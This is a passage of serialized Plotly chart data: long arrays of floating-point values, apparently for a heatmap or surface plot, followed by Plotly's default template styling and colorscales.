0.09904012829065323, 0.10379011929035187, 0.1047229990363121, 0.09707741439342499, 0.08443465828895569, 0.07497173547744751, 0.07071534544229507, 0.0687241181731224, 0.06253049522638321], [-0.07319462299346924, -0.062826968729496, -0.048564281314611435, -0.04408793896436691, -0.045538391917943954, -0.043133657425642014, -0.03814995661377907, -0.03376597538590431, -0.02878376469016075, -0.021158842369914055, -0.012712196446955204, -0.00748506560921669, -0.001857266528531909, 0.001986609073355794, 0.0019442117772996426, 0.002753452630713582, 0.010561231523752213, 0.02138751931488514, 0.027005566284060478, 0.026253320276737213, 0.02881169319152832, 0.03080877475440502, 0.027651382610201836, 0.02437628246843815, 0.028563907369971275, 0.03736506402492523, 0.0457790307700634, 0.0511152483522892, 0.053433772176504135, 0.058376461267471313, 0.06667688488960266, 0.07588353753089905, 0.08315637707710266, 0.09333010762929916, 0.10040496289730072, 0.1022476926445961, 0.10302799195051193, 0.10145317018032074, 0.10058818757534027, 0.10383369773626328, 0.10864445567131042, 0.10929521173238754, 0.10910472273826599, 0.1120331659913063, 0.11019075661897659, 0.10265932232141495, 0.08826731890439987, 0.07596635073423386, 0.06657232344150543, 0.06121792271733284], [-0.06671939045190811, -0.05787954851984978, -0.048358287662267685, -0.04684760048985481, -0.04887625575065613, -0.045718543231487274, -0.037592001259326935, -0.030020520091056824, -0.022300487384200096, -0.014608645811676979, -0.0084692919626832, -0.00683223083615303, -0.0025493763387203217, 0.0031190013978630304, 0.004004475194960833, 0.0071013993583619595, 0.018455905839800835, 0.02695881389081478, 0.026438452303409576, 0.02489495649933815, 0.028023336082696915, 0.030205681920051575, 0.028155677020549774, 0.025035260245203972, 0.02900056540966034, 0.0387614369392395, 0.048804737627506256, 0.055092547088861465, 0.05742063373327255, 0.06365776807069778, 0.07444658130407333, 0.08461607247591019, 0.09023047983646393, 0.09622693806886673, 0.10086056590080261, 0.10351927578449249, 0.10706273466348648, 0.10613041371107101, 0.10347005724906921, 0.10851199179887772, 0.11616918444633484, 0.11651153117418289, 0.112851083278656, 0.11410123109817505, 0.11447994410991669, 0.1126314029097557, 0.10224220901727676, 0.0888015404343605, 0.07546214014291763, 0.06754584610462189], [-0.06309422850608826, -0.055820535868406296, -0.05093444883823395, -0.05011000484228134, -0.050150834023952484, -0.047380752861499786, -0.03994423523545265, -0.030525827780365944, -0.01758396439254284, -0.007890701293945312, -0.0047643352299928665, -0.007697308901697397, -0.005726831499487162, 0.0009259398793801665, 0.007174248807132244, 0.014608415775001049, 0.02464316412806511, 0.02620958350598812, 0.018948616459965706, 0.0166443083435297, 0.02155260555446148, 0.0273492019623518, 0.02894843928515911, 0.02941272221505642, 0.03579104319214821, 0.044749900698661804, 0.052320681512355804, 0.056004736572504044, 0.05832286924123764, 0.06641313433647156, 0.08016319572925568, 0.09082683175802231, 0.09447242319583893, 0.09527291357517242, 0.09664587676525116, 0.09979182481765747, 0.1064046323299408, 0.10812979936599731, 0.10506080090999603, 0.10902076214551926, 0.1166270524263382, 0.11900096386671066, 0.11640793830156326, 0.11625711619853973, 0.11587518453598022, 0.11635137349367142, 0.11150495707988739, 0.10120559483766556, 0.08824162930250168, 0.07779219001531601], [-0.06367696076631546, -0.05724635347723961, -0.05736641213297844, -0.054812997579574585, -0.048734866082668304, -0.04399237409234047, -0.040087711066007614, -0.031901076436042786, -0.017464864999055862, -0.007647427264600992, -0.007187114097177982, -0.011565763503313065, -0.008574150502681732, -0.0010353595716878772, 0.010972855612635612, 0.019166935235261917, 0.022509509697556496, 0.01640436053276062, 0.009443327784538269, 0.01057459693402052, 0.01975260116159916, 0.02953900210559368, 0.03443644940853119, 0.03679269179701805, 0.04204491525888443, 0.04922615364193916, 0.0548025406897068, 0.05781171843409538, 0.06170766428112984, 0.07012632489204407, 0.07858778536319733, 0.08458004891872406, 0.08762534707784653, 0.0891418308019638, 0.09159834682941437, 0.09524928778409958, 0.10244493186473846, 0.10647609829902649, 0.10496216267347336, 0.10735982656478882, 0.1140318363904953, 0.12026156485080719, 0.12291846424341202, 0.122868113219738, 0.1200723797082901, 0.1178489699959755, 0.11278115957975388, 0.10471121221780777, 0.09489795565605164, 0.08607007563114166], [-0.06955478340387344, -0.06251604110002518, -0.06210186332464218, -0.0577295646071434, -0.048939116299152374, -0.04271727427840233, -0.040739212185144424, -0.034176722168922424, -0.02114109694957733, -0.01183833833783865, -0.01098609808832407, -0.011765191331505775, -0.005185718648135662, 0.001967101823538542, 0.011221571825444698, 0.013100449927151203, 0.011326336301863194, 0.0059747472405433655, 0.006993846967816353, 0.012081238441169262, 0.021330704912543297, 0.02837303653359413, 0.03348516672849655, 0.03691650554537773, 0.04232294112443924, 0.04873865470290184, 0.05254994332790375, 0.05328674986958504, 0.056499019265174866, 0.06471015512943268, 0.07200483977794647, 0.0768285021185875, 0.08046575635671616, 0.08563535660505295, 0.09144067764282227, 0.09562159329652786, 0.09808629751205444, 0.09857671707868576, 0.09759590029716492, 0.09906435012817383, 0.10504961013793945, 0.11330132931470871, 0.11977969110012054, 0.12126903980970383, 0.11787456274032593, 0.11600284278392792, 0.11353093385696411, 0.1076122522354126, 0.10054931789636612, 0.09445149451494217], [-0.07104654610157013, -0.06395328789949417, -0.06317837536334991, -0.06023484095931053, -0.05324184149503708, -0.046927958726882935, -0.0446234792470932, -0.03855572268366814, -0.02561783231794834, -0.015103527344763279, -0.011802224442362785, -0.007869998924434185, 0.0008580202120356262, 0.0059761893935501575, 0.008576999418437481, 0.003653622232377529, -0.0003311189357191324, -0.002804894233122468, 0.0038095919881016016, 0.010757056064903736, 0.0183569248765707, 0.021582838147878647, 0.025901665911078453, 0.030089709907770157, 0.036514826118946075, 0.04230879247188568, 0.044446639716625214, 0.04281611740589142, 0.04429022595286369, 0.05242408439517021, 0.06385888904333115, 0.07187934219837189, 0.07616078853607178, 0.08138690143823624, 0.08813794702291489, 0.09364131093025208, 0.09228182584047318, 0.08775504678487778, 0.0854833573102951, 0.08647340536117554, 0.09297157824039459, 0.1017100140452385, 0.10918616503477097, 0.11179174482822418, 0.10961181670427322, 0.11112705618143082, 0.1143745705485344, 0.11170708388090134, 0.10637790709733963, 0.10022692382335663], [-0.0650733932852745, -0.05891033262014389, -0.062368202954530716, -0.06549137085676193, -0.06234319880604744, -0.05361171066761017, -0.04822827875614166, -0.04244650900363922, -0.030347635969519615, -0.019154870882630348, -0.012751828879117966, -0.0022575079929083586, 0.0065156989730894566, 0.006062200292944908, 0.0028898650780320168, -0.004425670485943556, -0.01138807088136673, -0.015193823724985123, -0.007507794536650181, 0.0007684684824198484, 0.010507049970328808, 0.016191255301237106, 0.021000659093260765, 0.024351773783564568, 0.027222396805882454, 0.02893454022705555, 0.029644956812262535, 0.032518088817596436, 0.03753553330898285, 0.04548992961645126, 0.055763620883226395, 0.06530016660690308, 0.07102658599615097, 0.07334049046039581, 0.07949962466955185, 0.08893871307373047, 0.08922996371984482, 0.08079899847507477, 0.0749422237277031, 0.07347427308559418, 0.08174799382686615, 0.09184441715478897, 0.10101889818906784, 0.10437479615211487, 0.10363008081912994, 0.10294629633426666, 0.10510421544313431, 0.10792793333530426, 0.10832475870847702, 0.10055568814277649], [-0.060713112354278564, -0.054369159042835236, -0.05818089097738266, -0.06490570306777954, -0.06616797298192978, -0.06061140075325966, -0.055468495935201645, -0.049091581255197525, -0.03536996617913246, -0.022809546440839767, -0.015624831430613995, -0.004822821822017431, 0.0007301010773517191, -0.0028725930023938417, -0.0033046663738787174, -0.0055900271981954575, -0.015271404758095741, -0.02527446672320366, -0.022810472175478935, -0.014084316790103912, -0.0016574887558817863, 0.007044285535812378, 0.012160097248852253, 0.015730369836091995, 0.018798910081386566, 0.018502021208405495, 0.017267966642975807, 0.02137904241681099, 0.02954188920557499, 0.03829551488161087, 0.044974878430366516, 0.05328576639294624, 0.05977138504385948, 0.06162653863430023, 0.06850098073482513, 0.08126766979694366, 0.08814199268817902, 0.08167076110839844, 0.07319860905408859, 0.06713259965181351, 0.07297118008136749, 0.08229775726795197, 0.09034639596939087, 0.092264324426651, 0.09319084882736206, 0.09110527485609055, 0.0914417952299118, 0.09770406037569046, 0.10362734645605087, 0.09838449954986572], [-0.06121376156806946, -0.053919218480587006, -0.05388696491718292, -0.05945907160639763, -0.06281699985265732, -0.06312074512243271, -0.06040644645690918, -0.05264177918434143, -0.03682023286819458, -0.02421005629003048, -0.019446680322289467, -0.013591650873422623, -0.011427530087530613, -0.014086510054767132, -0.010107642970979214, -0.008928961120545864, -0.019984422251582146, -0.03239373117685318, -0.03186241164803505, -0.022851061075925827, -0.010925215668976307, -0.003741129068657756, 0.0004574620979838073, 0.004758037161082029, 0.011034619063138962, 0.011561814695596695, 0.008531852625310421, 0.009301961399614811, 0.018162600696086884, 0.029385969042778015, 0.0369257852435112, 0.04461543634533882, 0.05057593807578087, 0.05372864753007889, 0.06106080114841461, 0.0735287219285965, 0.08317549526691437, 0.07949342578649521, 0.07067396491765976, 0.061192940920591354, 0.061980634927749634, 0.06872566789388657, 0.07471885532140732, 0.07592989504337311, 0.0787397176027298, 0.07999305427074432, 0.08324380964040756, 0.08945362269878387, 0.09648939222097397, 0.09609562903642654], [-0.057244300842285156, -0.05120433121919632, -0.05173971503973007, -0.05502396076917648, -0.057689227163791656, -0.06279968470335007, -0.05949772149324417, -0.04754360392689705, -0.032742563635110855, -0.022355541586875916, -0.018745524808764458, -0.020912859588861465, -0.02548169158399105, -0.025763683021068573, -0.019534755498170853, -0.018386321142315865, -0.028631258755922318, -0.03494706749916077, -0.030630910769104958, -0.024889782071113586, -0.015529346652328968, -0.00596261490136385, -0.0009351445478387177, 0.0009953175904229283, 0.003438460873439908, 0.002566945506259799, -0.0011382651282474399, 0.00019226991571485996, 0.012149094603955746, 0.02647254429757595, 0.03524382412433624, 0.04187509045004845, 0.04778238758444786, 0.05146622285246849, 0.0543837808072567, 0.06122706085443497, 0.07000765204429626, 0.07169272005558014, 0.06543020904064178, 0.05755284056067467, 0.05360965058207512, 0.05565157160162926, 0.06195669621229172, 0.06760479509830475, 0.0711459293961525, 0.07523837685585022, 0.08063936978578568, 0.08230636268854141, 0.08323808759450912, 0.08520501852035522], [-0.04850172623991966, -0.045086849480867386, -0.0502140074968338, -0.052767232060432434, -0.052537333220243454, -0.0549221970140934, -0.04744706675410271, -0.033395882695913315, -0.026847630739212036, -0.02375856600701809, -0.020831501111388206, -0.0240345261991024, -0.029224194586277008, -0.02758818492293358, -0.02265034429728985, -0.024249110370874405, -0.032611530274152756, -0.034106433391571045, -0.028858499601483345, -0.027200134471058846, -0.01959920860826969, -0.006107456982135773, 0.0002282079658471048, 0.0006585312657989562, 0.0006583295180462301, -0.0010673500364646316, -0.004887684248387814, -0.0024058057460933924, 0.01100943237543106, 0.025391051545739174, 0.031635139137506485, 0.03589640185236931, 0.042236123234033585, 0.04712356626987457, 0.04655129835009575, 0.04781215265393257, 0.05135625600814819, 0.05387232452630997, 0.04987897351384163, 0.047906965017318726, 0.0455312617123127, 0.04572097957134247, 0.05499007925391197, 0.06680403649806976, 0.07064627856016159, 0.0753917470574379, 0.08024962246417999, 0.07711873948574066, 0.0711154192686081, 0.0721004456281662], [-0.04288571700453758, -0.04005184769630432, -0.04539710283279419, -0.047304410487413406, -0.04528298228979111, -0.043841343373060226, -0.034675341099500656, -0.022209113463759422, -0.022583352401852608, -0.026051335036754608, -0.02588832937180996, -0.027161402627825737, -0.029410813003778458, -0.027476774528622627, -0.02211773954331875, -0.021968629211187363, -0.02765529416501522, -0.030683478340506554, -0.030095165595412254, -0.029908541589975357, -0.02261413261294365, -0.008977853693068027, -0.002709068590775132, -7.418223685817793e-05, 0.004815218038856983, 0.004578979220241308, -0.0006177151226438582, -0.0022468739189207554, 0.007558110170066357, 0.018773656338453293, 0.020900731906294823, 0.023003360256552696, 0.029421553015708923, 0.03615183383226395, 0.03671018034219742, 0.03703968599438667, 0.03761431202292442, 0.037643030285835266, 0.03325999900698662, 0.03404085338115692, 0.03573943302035332, 0.03864147141575813, 0.05051606148481369, 0.06413562595844269, 0.06838274747133255, 0.07317540049552917, 0.07767818123102188, 0.0737605020403862, 0.06674660742282867, 0.06696069985628128], [-0.043088190257549286, -0.03993033245205879, -0.04374142736196518, -0.04579766094684601, -0.04235529154539108, -0.035136155784130096, -0.026627497747540474, -0.019033538177609444, -0.01962791569530964, -0.02292010933160782, -0.026067223399877548, -0.029943922534585, -0.03240709751844406, -0.03069712594151497, -0.026454249396920204, -0.023084016516804695, -0.02357385866343975, -0.029092103242874146, -0.03461135923862457, -0.032455481588840485, -0.022143373265862465, -0.007591591216623783, 0.0006635865429416299, 0.0075921230018138885, 0.014778690412640572, 0.012959285639226437, 0.004877239931374788, -0.00098619784694165, 0.004997379146516323, 0.014195731841027737, 0.017630819231271744, 0.017626523971557617, 0.019680358469486237, 0.02231777273118496, 0.023688269779086113, 0.024765970185399055, 0.026522507891058922, 0.026406196877360344, 0.021707674488425255, 0.022334182634949684, 0.02505245804786682, 0.030465707182884216, 0.04480009526014328, 0.06003927066922188, 0.06515728682279587, 0.06925018876791, 0.07531572878360748, 0.07569468021392822, 0.07214803993701935, 0.06814651936292648], [-0.04201648756861687, -0.038620948791503906, -0.040417611598968506, -0.04219970852136612, -0.03842165693640709, -0.03057989664375782, -0.026804622262716293, -0.02511787600815296, -0.022754143923521042, -0.021602613851428032, -0.02510450966656208, -0.0294115599244833, -0.03121335059404373, -0.02983132191002369, -0.0295267216861248, -0.026664774864912033, -0.02388046123087406, -0.028593052178621292, -0.03400694578886032, -0.028188135474920273, -0.01722361333668232, -0.006454578600823879, 0.0032078749500215054, 0.013056694529950619, 0.017779851332306862, 0.012795241549611092, 0.0037632561288774014, -0.0012223124504089355, 0.003055129898712039, 0.010468882508575916, 0.01639985665678978, 0.015152325853705406, 0.013646121136844158, 0.014114475809037685, 0.017240412533283234, 0.017765410244464874, 0.0179829690605402, 0.016026010736823082, 0.011551624163985252, 0.011775949969887733, 0.014187405817210674, 0.02059408463537693, 0.03628482669591904, 0.05306840315461159, 0.059831153601408005, 0.06272450089454651, 0.06936918199062347, 0.07521065324544907, 0.07871489971876144, 0.07554060220718384], [-0.036698464304208755, -0.03393173962831497, -0.034713469445705414, -0.03474155068397522, -0.030555693432688713, -0.026138661429286003, -0.026746219024062157, -0.028827844187617302, -0.02977691777050495, -0.028647245839238167, -0.028403669595718384, -0.02486094832420349, -0.020995941013097763, -0.0194436926394701, -0.022098692134022713, -0.022955788299441338, -0.022102560847997665, -0.026646187528967857, -0.030368350446224213, -0.023927494883537292, -0.01613985188305378, -0.01126838382333517, -0.0027357416693121195, 0.007831627503037453, 0.012819844298064709, 0.008432223461568356, 0.0008495327201671898, -0.0024376241490244865, 0.0006328783347271383, 0.005528655834496021, 0.009294756688177586, 0.008124634623527527, 0.00900265946984291, 0.014561562798917294, 0.019840316846966743, 0.01714039221405983, 0.010211208835244179, 0.0032672134693711996, -0.0005801885272376239, 0.0016091796569526196, 0.0051061916165053844, 0.010371903888881207, 0.025364061817526817, 0.04305609315633774, 0.05201347544789314, 0.055714525282382965, 0.062119897454977036, 0.06964317709207535, 0.077232226729393, 0.08002301305532455], [-0.028284071013331413, -0.02712857909500599, -0.02960723452270031, -0.027621546760201454, -0.022537998855113983, -0.022572439163923264, -0.024919481948018074, -0.026725711300969124, -0.032328639179468155, -0.03530697524547577, -0.032297465950250626, -0.02230718731880188, -0.015463055111467838, -0.015274935401976109, -0.017042990773916245, -0.015587914735078812, -0.015433556400239468, -0.02127053402364254, -0.02744349278509617, -0.02300160750746727, -0.016267606988549232, -0.010871335864067078, -0.0031914073042571545, 0.003646830329671502, 0.005600887816399336, 0.004238035064190626, 0.0007575135095976293, -0.0036973366513848305, -0.004726582206785679, -0.002699064090847969, 0.00045010470785200596, 0.004212376661598682, 0.010394332930445671, 0.019549788907170296, 0.02546493336558342, 0.022348206490278244, 0.00998328160494566, -0.0039034229703247547, -0.009329428896307945, -0.008330412209033966, -0.004524636082351208, -0.0004555039049591869, 0.012942727655172348, 0.03260901942849159, 0.047057557851076126, 0.0567135214805603, 0.0625305101275444, 0.06686031818389893, 0.07042854279279709, 0.07357078045606613], [-0.025853751227259636, -0.025247616693377495, -0.027899496257305145, -0.022955721244215965, -0.016199225559830666, -0.01811528019607067, -0.01895546168088913, -0.017225587740540504, -0.02307267114520073, -0.029766766354441643, -0.027594471350312233, -0.01882159896194935, -0.015245256945490837, -0.017490630969405174, -0.01821405254304409, -0.012438512407243252, -0.010246948339045048, -0.014183330349624157, -0.020944250747561455, -0.018604237586259842, -0.011799212545156479, -0.003482686821371317, 0.0029719998128712177, 0.004535115789622068, 0.0033717656042426825, 0.005902822129428387, 0.007054631598293781, 0.0004121628007851541, -0.005610398016870022, -0.00659339502453804, -0.00376663520000875, 0.00576635729521513, 0.01579686440527439, 0.02033909782767296, 0.02198716253042221, 0.02187873050570488, 0.01469600573182106, 0.0011446797288954258, -0.006721870042383671, -0.010269632562994957, -0.008119024336338043, -0.004700131714344025, 0.004071385599672794, 0.02142786979675293, 0.04117082059383392, 0.05918937176465988, 0.06556602567434311, 0.06453650444746017, 0.06043701246380806, 0.06134191155433655], [-0.0246367659419775, -0.022239821031689644, -0.021303324028849602, -0.013842333108186722, -0.006134754978120327, -0.007745285984128714, -0.008166473358869553, -0.005833346862345934, -0.010691291652619839, -0.018961872905492783, -0.020147932693362236, -0.014540055766701698, -0.012891260907053947, -0.01567992940545082, -0.0188374575227499, -0.013934175483882427, -0.008378622122108936, -0.005526767577975988, -0.005807261448353529, -0.0021813276689499617, 0.002082070568576455, 0.005002067424356937, 0.007553841453045607, 0.006634872872382402, 0.005615130998194218, 0.008801767602562904, 0.010999803431332111, 0.006071712821722031, 0.00015355007781181484, -0.002138839801773429, -0.0022856066934764385, 0.0059028202667832375, 0.015087410807609558, 0.015651719644665718, 0.015092829242348671, 0.017224201932549477, 0.017028683796525, 0.00855258945375681, 0.0006306880968622863, -0.004254054743796587, -0.0035523639526218176, -0.001630070386454463, 0.001663894159719348, 0.013065610080957413, 0.03274749964475632, 0.052274614572525024, 0.05851295217871666, 0.05584030598402023, 0.05198100954294205, 0.05733688920736313], [-0.01878304034471512, -0.016055775806307793, -0.010554964654147625, -0.0030537170823663473, 0.002602097112685442, 0.0030220155604183674, 0.002381180413067341, 0.0012994547141715884, -0.004306370858103037, -0.011114909313619137, -0.014060156419873238, -0.013264289125800133, -0.0147475590929389, -0.016406171023845673, -0.01718311384320259, -0.010812613181769848, -0.0027535180561244488, 0.005525027401745319, 0.010362397879362106, 0.014119066298007965, 0.01648600772023201, 0.015902094542980194, 0.014484993182122707, 0.010879592970013618, 0.010581192560493946, 0.014047416858375072, 0.01741311326622963, 0.016348684206604958, 0.010696761310100555, 0.00564964022487402, 0.0012435317039489746, 0.006751471199095249, 0.01482737809419632, 0.015410667285323143, 0.013213478960096836, 0.0138937933370471, 0.015515709295868874, 0.013366413302719593, 0.008946318179368973, 0.006029825191944838, 0.005286811385303736, 0.005605738610029221, 0.003994700964540243, 0.007865612395107746, 0.023953808471560478, 0.04246743768453598, 0.050089363008737564, 0.047297053039073944, 0.04589949920773506, 0.05558069795370102], [-0.006195694673806429, -0.00559283047914505, 0.0016715696547180414, 0.005379856564104557, 0.006055162288248539, 0.009467480704188347, 0.008772740140557289, 0.0020703680347651243, -0.0060302033089101315, -0.00875343382358551, -0.010311868041753769, -0.013396522961556911, -0.018363339826464653, -0.01878485083580017, -0.014106682501733303, -0.0046235970221459866, 0.0045376988127827644, 0.014722402207553387, 0.020193301141262054, 0.021849073469638824, 0.02574899047613144, 0.02983454056084156, 0.027460845187306404, 0.021206814795732498, 0.0204613134264946, 0.023990528658032417, 0.0276810210198164, 0.02690277434885502, 0.018687715753912926, 0.010244923643767834, 0.004897584207355976, 0.009693787433207035, 0.016717985272407532, 0.021082613617181778, 0.01823389157652855, 0.014684665948152542, 0.010988222435116768, 0.012327782809734344, 0.012878411449491978, 0.011927604675292969, 0.00831935741007328, 0.008170956745743752, 0.00886457972228527, 0.012635285966098309, 0.023774638772010803, 0.03852448984980583, 0.046821802854537964, 0.04465729370713234, 0.04461410269141197, 0.05257171392440796], [0.0018808860331773758, 0.0019585697446018457, 0.008154749870300293, 0.008944493718445301, 0.0069402847439050674, 0.01066309493035078, 0.010365244932472706, 0.0029840583447366953, -0.004019689746201038, -0.0033566139172762632, -0.0029567736200988293, -0.0055143809877336025, -0.011374132707715034, -0.013735143467783928, -0.012482083402574062, -0.00599979842081666, 0.0042133149690926075, 0.01754583977162838, 0.025486858561635017, 0.026583367958664894, 0.031192008405923843, 0.038212329149246216, 0.037739794701337814, 0.0328175388276577, 0.03284831345081329, 0.03626297414302826, 0.038896963000297546, 0.03560619428753853, 0.025492772459983826, 0.015785949304699898, 0.010802838020026684, 0.014356289058923721, 0.018724408000707626, 0.023083969950675964, 0.02059832401573658, 0.017220670357346535, 0.012571802362799644, 0.014018772169947624, 0.014667212031781673, 0.012330997735261917, 0.007285116706043482, 0.008469444699585438, 0.014001349918544292, 0.021537568420171738, 0.02917000837624073, 0.03897835686802864, 0.044532373547554016, 0.04317669942975044, 0.044465817511081696, 0.05111240968108177], [0.0031087370589375496, 0.0033785162959247828, 0.009885755367577076, 0.011391923762857914, 0.00971985049545765, 0.012831372208893299, 0.01318634394556284, 0.0076056052930653095, 0.0018704666290432215, 0.004094247706234455, 0.006303244270384312, 0.0040868474170565605, -0.001972807804122567, -0.005736948922276497, -0.010334383696317673, -0.010339722968637943, -0.0004949058638885617, 0.016028976067900658, 0.02759052813053131, 0.028793523088097572, 0.033206757158041, 0.04248784855008125, 0.045941464602947235, 0.04413601756095886, 0.043984346091747284, 0.0465397983789444, 0.04848543927073479, 0.043990567326545715, 0.0335182324051857, 0.023442450910806656, 0.018107911571860313, 0.01993544027209282, 0.021706342697143555, 0.024454912170767784, 0.02192358486354351, 0.01998448744416237, 0.01844925992190838, 0.020405856892466545, 0.018712561577558517, 0.014417611062526703, 0.009080134332180023, 0.011062839068472385, 0.018242770805954933, 0.028045253828167915, 0.03374601528048515, 0.03796112909913063, 0.03916620463132858, 0.041241373866796494, 0.04694007709622383, 0.05312880501151085], [0.0012528664665296674, 0.0008864431292749941, 0.007588230073451996, 0.012617615051567554, 0.013963158242404461, 0.016229121014475822, 0.017100287601351738, 0.01421851571649313, 0.008879815228283405, 0.010305278934538364, 0.012640978209674358, 0.0070013245567679405, -0.0003466681810095906, -0.002650606445968151, -0.006367804948240519, -0.007856319658458233, 0.0012663229135796428, 0.017492441460490227, 0.02868366427719593, 0.029507368803024292, 0.03257668763399124, 0.04273202270269394, 0.050096314400434494, 0.05137797072529793, 0.05004815757274628, 0.05124645307660103, 0.053739696741104126, 0.051434215158224106, 0.04264447093009949, 0.03268880397081375, 0.025583824142813683, 0.025594869628548622, 0.026236247271299362, 0.028268449008464813, 0.02570083923637867, 0.024752449244260788, 0.02629273571074009, 0.02783249318599701, 0.023056572303175926, 0.020230460911989212, 0.017892751842737198, 0.018676793202757835, 0.021028559654951096, 0.028471576049923897, 0.03395598754286766, 0.034668855369091034, 0.034145843237638474, 0.04268660768866539, 0.05489252507686615, 0.05953839793801308]]}], {\"template\": {\"data\": {\"bar\": [{\"error_x\": {\"color\": \"#2a3f5f\"}, \"error_y\": {\"color\": \"#2a3f5f\"}, \"marker\": {\"line\": {\"color\": \"#E5ECF6\", \"width\": 0.5}}, \"type\": \"bar\"}], \"barpolar\": [{\"marker\": {\"line\": {\"color\": \"#E5ECF6\", \"width\": 0.5}}, \"type\": \"barpolar\"}], \"carpet\": [{\"aaxis\": {\"endlinecolor\": \"#2a3f5f\", \"gridcolor\": \"white\", \"linecolor\": \"white\", \"minorgridcolor\": \"white\", \"startlinecolor\": \"#2a3f5f\"}, \"baxis\": {\"endlinecolor\": \"#2a3f5f\", \"gridcolor\": \"white\", \"linecolor\": \"white\", \"minorgridcolor\": \"white\", \"startlinecolor\": \"#2a3f5f\"}, \"type\": \"carpet\"}], \"choropleth\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"type\": \"choropleth\"}], \"contour\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"colorscale\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"type\": \"contour\"}], \"contourcarpet\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"type\": \"contourcarpet\"}], \"heatmap\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"colorscale\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"type\": \"heatmap\"}], \"heatmapgl\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"colorscale\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"type\": \"heatmapgl\"}], \"histogram\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"histogram\"}], \"histogram2d\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"colorscale\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"type\": \"histogram2d\"}], \"histogram2dcontour\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"colorscale\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"type\": \"histogram2dcontour\"}], \"mesh3d\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"type\": \"mesh3d\"}], \"parcoords\": [{\"line\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"parcoords\"}], \"pie\": [{\"automargin\": true, \"type\": \"pie\"}], \"scatter\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scatter\"}], \"scatter3d\": [{\"line\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scatter3d\"}], \"scattercarpet\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scattercarpet\"}], \"scattergeo\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scattergeo\"}], \"scattergl\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scattergl\"}], \"scattermapbox\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scattermapbox\"}], \"scatterpolar\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scatterpolar\"}], \"scatterpolargl\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scatterpolargl\"}], \"scatterternary\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scatterternary\"}], \"surface\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"colorscale\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"type\": \"surface\"}], \"table\": [{\"cells\": {\"fill\": {\"color\": \"#EBF0F8\"}, \"line\": {\"color\": \"white\"}}, \"header\": {\"fill\": {\"color\": \"#C8D4E3\"}, \"line\": {\"color\": \"white\"}}, \"type\": \"table\"}]}, \"layout\": {\"annotationdefaults\": {\"arrowcolor\": \"#2a3f5f\", \"arrowhead\": 0, \"arrowwidth\": 1}, \"coloraxis\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"colorscale\": {\"diverging\": [[0, \"#8e0152\"], [0.1, \"#c51b7d\"], [0.2, \"#de77ae\"], 